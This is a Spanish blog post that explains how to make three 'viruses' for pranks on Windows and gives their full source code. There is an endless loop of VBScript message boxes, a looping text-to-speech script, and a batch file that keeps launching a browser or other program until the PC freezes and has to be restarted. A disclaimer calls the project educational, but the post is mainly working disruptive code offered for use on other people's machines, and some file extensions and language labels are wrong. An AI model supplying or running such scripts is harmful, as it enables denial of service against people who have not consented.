---
layout: single
title: Tres tipos de virus y como crearlos
excerpt: "En este post, vamos a estar viendo como podemos crear muy fácilmente tres virus para windows"
date: 2022-02-04
classes: wide
header:
  teaser: /assets/images/tres_tipos_de_virus_y_como_crearlos_1.jpg
  teaser_home_page: true
categories:
  - Virus
  - Windows
  - Noob
  - Batch
tags:
  - Virus
  - Noob
  - Windows
  - Batch
---

![](/assets/images/tres_tipos_de_virus_y_como_crearlos_1.jpg)

Buenas tardes a todos, hoy vamos a aprender como crear tres tipos de virus para gastar alguna broma.

##ATENCIÓN:   EL CREADOR DES ESTE BLOG NO SE HACE RESPONSABLE DEL MAL USO QUE SE LE PUEDA DAR A ESTE PROYECTO, EL CUAL FUE CREADO CON FINES EDUCATIVOS.

Cada virus, es de un nivel diferente, el nivel 1 es el más fácil de desactivar, pero el 3 puedes llegar a tener que apagar el ordenador.


# Nivel 1 .cvs
_______________________________________________
```Batch

do 
Mensaje=msgbox("Hola" ,16, "Mensaje") 
Mensaje=msgbox("¿Qué haces?" ,16, "Mensaje") 
Mensaje=msgbox("Quieres salir?" ,16, "Mensaje") 
Mensaje=msgbox("Estas segur@?" ,16, "Mensaje") 
Mensaje=msgbox("Pero no puedes" ,16, "Mensaje") 
Mensaje=msgbox("infinito python" ,16, "Mensaje") 
loop 
```

En este nivel, se crean un montón de carteles con la frase que quieras, sustituyendo las frases que están entre comillas por la que quieras.


# Nivel 2 .cvs

_______________________________________________

```Batch
do 
Dim var1, var2 var1="infinito python" 
Set va2=CreateObject("sapi.spvoice") 
va2.Speak 
var1 
loop 
```




En este script, lo que hace es hablar todo el contenido donde está situado infinito python.





# Nivel 3 .bat

_______________________________________________



```Batch
:bucle 
@echo off 
start iexplore.exe 
goto bucle 
```



_______________________________________________


El "iexplore.exe" lo puedes cambiar por "explorer.exe " o "chrome.exe" o "winword.exe" o "notepad.exe"


_______________________________________________




Este último nivel, es el más peligroso, por que empieza a abrir páginas de la aplicación deseada lo cual puede ocasionar que el pc se congele y haya que reiniciarlo.


Excepto el 3, puedes desactivar cualquiera desde el administrador de tareas (ctrl+alt+supr, buscando el nombre del archivo y finalizando la tarea.



En el nombre de los niveles, he puesto la terminación con la que hay que guardar el archivo para que funcione.





